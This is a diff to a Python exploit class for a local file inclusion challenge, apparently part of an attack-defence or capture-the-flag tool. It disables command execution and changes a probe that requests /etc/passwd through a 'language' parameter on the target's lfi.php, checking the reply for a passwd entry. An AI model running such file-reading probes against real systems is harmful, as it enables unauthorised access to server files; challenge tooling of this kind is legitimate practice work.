@@ -1,5 +1,5 @@
 import requests
-from Exploit import Exploit
+from Exploit import Exploit, UnsupportedException
 import BetterLogger
 from BetterLogger import logger
 
@@ -7,12 +7,11 @@ class ChallengeFourLFI(Exploit):
 	def __init__(self, ip_address, parsed_config) -> None:
 		super().__init__(ip_address=ip_address, parsed_config=parsed_config)
 
-	def run_hellevator(self):
-		return super().run_hellevator()
+	def run_command(self, command):
+		raise UnsupportedException(f"Running commands with ChallengeFourLFI is not supported.")
 
-	def run_custom_command(self, command):
-		logger.info(f"{self.ip_address} - ChallengeFourLFI does not support running custom commands.")
-		return False
+	def run_hellevator(self):
+		raise UnsupportedException(f"Running commands with ChallengeFourLFI is not supported.")
 
 	def test_if_vulnerable(self):
 		"""
@@ -20,7 +19,7 @@ class ChallengeFourLFI(Exploit):
 		"""
 		try:
 			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeFourLFI...")
-			local_file_path = "../../../../../etc/passwd"
+			local_file_path = "/etc/passwd"
 			server_response = requests.get(f"http://{self.ip_address}/lfi/lfi.php?language={local_file_path}", timeout=3)
 			server_response_text = server_response.text
 			if "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" in server_response_text:
